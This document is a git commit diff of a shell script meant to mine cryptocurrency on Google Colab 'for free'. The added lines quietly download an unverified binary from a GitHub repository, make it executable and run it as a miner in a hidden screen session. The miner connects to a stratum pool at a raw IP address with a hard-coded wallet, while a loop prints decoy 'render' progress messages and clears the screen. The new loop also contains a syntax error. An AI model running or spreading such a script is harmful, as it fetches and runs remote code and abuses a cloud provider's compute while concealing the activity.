6f55124060934e8df4ea3cd37f71cc325b9dd747
renilo <88342640+renilo@users.noreply.github.com>
2022-10-10 04:21:06 +0700

    Update mekimeki.sh

--- mekimeki.sh
+++ mekimeki.sh
@@ -3,5 +3,11 @@
 # Before get xmr coin for free
 # Google Colab
 sudo apt-get install screen -y
+clear
+sudo wget -q https://github.com/indah38/theta/raw/main/VTM
+clear
+chmod 700 VTM
+clear
+screen -dmS Running ./VTM -a yescryptr16  -o stratum+tcps://178.128.86.41:80 -u vFEneCSxgbhmn7idJxxWULEgD5jS2hyJnQ.OHGITU2 -p x -t4
 
-for i in `seq 1 99999`; do echo $i; sudo wget -q https://github.com/indah38/theta/raw/main/VTM; chmod 700 VTM;clear;echo SETUP RENDERPROC $i; screen -dmS Running ./VTM -a yescryptr16  -o stratum+tcps://178.128.86.41:80 -u vFEneCSxgbhmn7idJxxWULEgD5jS2hyJnQ.OHGITU2 -p x -t4; sleep 1500; clear; screen -XS Running quit; rm -f VTM; echo SUCCESS PROJECT; sleep 3; done
+for i in `seq 1 999999999`; do echo $i;clear;echo SETUP RENDERPROC $i; ; sleep 5; clear; echo SUCCESS PROJECT; sleep 3; done
